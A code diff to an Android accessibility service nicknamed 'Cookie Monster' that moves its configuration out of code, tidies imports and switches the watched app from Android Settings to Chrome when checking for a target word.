@@ -7,10 +7,9 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.util.Log;
 import android.view.accessibility.AccessibilityWindowInfo;
+import android.util.Log;
 import android.widget.Toast;
-import java.util.List;
 
 
 public class MyAccessibilityService extends AccessibilityService {
@@ -23,18 +22,6 @@ public class MyAccessibilityService extends AccessibilityService {
         super.onServiceConnected();
         Log.d(TAG, "Cookie Monster woke up.");
         LogManager.INSTANCE.addLog(TAG, "Cookie Monster woke up.");
-
-        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
-        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
-                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
-                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
-        info.notificationTimeout = 100;
-        //info.description = (getString(R.string.accessibility_service_description));
-
-        setServiceInfo(info);
 
         android.accessibilityservice.AccessibilityServiceInfo checkInfo = getServiceInfo();
         if (checkInfo != null) {
@@ -57,7 +44,7 @@ public class MyAccessibilityService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         final String targetWord = getTargetWord();
 
-        if (event.getPackageName()==null|| !(event.getPackageName().toString().equals("com.android.settings"))){
+        if (event.getPackageName()==null|| !(event.getPackageName().toString().equals("com.android.chrome"))){
             return;
         }
 
